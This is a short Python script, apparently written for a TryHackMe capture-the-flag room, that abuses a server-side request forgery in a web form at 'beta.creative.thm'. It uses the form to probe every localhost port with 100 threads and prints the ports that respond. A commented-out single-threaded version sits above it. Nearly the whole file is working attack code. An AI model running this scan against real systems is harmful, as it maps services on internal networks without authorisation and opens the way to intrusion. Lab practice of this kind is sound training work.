# own script (for testing)
# import requests
# import bs4

# url = 'http://beta.creative.thm/'

# for i in range(1,65535):
#     data = { 
#         'url' : f'http://localhost:{i}/'
#     }

#     resp = requests.post(url,data=data)

#     if resp.text != '<p> Dead </p>':
#         print(f"Port {i} responded:")        
#         print(resp.text)
#         # print("success\n")

# just added threads to increase speed w help of ChatGPT
import requests
from concurrent.futures import ThreadPoolExecutor

url = 'http://beta.creative.thm/'

# Function to send the request and handle response
def check_port(i):
    data = { 
        'url': f'http://localhost:{i}/'
    }

    try:
        resp = requests.post(url, data=data)

        # If the response text is not '<p> Dead </p>', print the response
        if resp.text != '<p> Dead </p>':
            print(f"Port {i} responded:")
            print(resp.text)
    except requests.RequestException as e:
        # Handle potential request exceptions like timeouts or connection errors
        print(f"Error with port {i}: {e}")

# Increase the number of threads for concurrent requests
thread_count = 100  # Adjust thread number as needed

# Create a ThreadPoolExecutor to handle concurrent threads
with ThreadPoolExecutor(max_workers=thread_count) as executor:
    # Submit tasks to the executor
    executor.map(check_port, range(1, 65535))
